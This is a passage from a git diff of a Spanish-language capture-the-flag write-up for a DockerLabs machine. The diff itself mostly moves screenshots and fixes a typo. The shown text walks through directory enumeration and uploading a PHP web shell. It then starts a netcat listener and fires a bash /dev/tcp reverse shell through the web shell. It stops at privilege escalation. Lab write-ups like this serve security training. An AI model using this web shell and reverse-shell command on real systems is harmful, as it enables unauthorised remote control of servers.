@@ -21,6 +21,9 @@ Vemos que hay un puerto 80 abierto y entramos desde firefox.
 
 
 Entramos y vemos una pagina web con un apartado para subir archivos.
+
+![Captura de pantalla 2024-05-13 001149](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/289a79e0-f7c1-4cf6-808f-946ab1c4059f)
+
 Realizamos un escaneo de subdominios con gobuster para ver si encontramos algo interesante.
 
 ```shell
@@ -45,9 +48,11 @@ Starting gobuster in directory enumeration mode
 
 Encontramos un subdominio *http://172.17.0.2/uploads/*.
 Entramos y podemos ver que es donde se alojan los archivos subidos.
-![Captura de pantalla 2024-05-13 001149](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/289a79e0-f7c1-4cf6-808f-946ab1c4059f)
+
 ![Captura de pantalla 2024-05-13 002043](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/418a59e7-daa7-4819-b895-376a3286d882)
+
 Creamos un script en formato ".php" con el siguiente contenido
+
 ```shell
 <?php
 	system($_GET['cmd']);
@@ -55,16 +60,18 @@ Creamos un script en formato ".php" con el siguiente contenido
 ```
 
 Lo subimos y llamamos al archivo con un "?cmd=id" quedando de esta manera:
+
 ![Captura de pantalla 2024-05-13 204619](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/7b55fd0a-62eb-4f95-bdbc-cc921362b579)
 
 ```shell
 http://172.17.0.2/uploads/cmd.php?cmd=id
 ```
 
-Entramos a "https://www.revshells.com/" en esta web encontramos revershells ya generadas y listas para copiar y para cambiar los parametros de una manera sencilla
+Entramos a "https://www.revshells.com/" en esta web encontramos reverse shells ya generadas y listas para copiar y para cambiar los parametros de una manera sencilla
+
 ![Captura de pantalla 2024-05-13 204754](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/0a20f8dd-895e-4ead-8ab9-b8e171bc2423)
 ![Captura de pantalla 2024-05-13 204807](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/28ff216f-eaf8-4fe3-95ac-4520704adc72)
-![Captura de pantalla 2024-05-13 210138](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/853d7ccc-3224-4c5d-8495-0247a5960d9d)
+
 
 Ejecutamos netcat con el puento 9001 como puerto de escucha
 ```shell
@@ -78,6 +85,8 @@ Ejecutamos la reverse shell de manera en que llamemos al archivo "cmd.php" y le 
 http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9001 0>%261" )
 
 ```
+
+![Captura de pantalla 2024-05-13 210138](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/853d7ccc-3224-4c5d-8495-0247a5960d9d)
 
 Ahora solo faltaria la escalada de privilegios
 Comprobamos los permisos del usuario con:
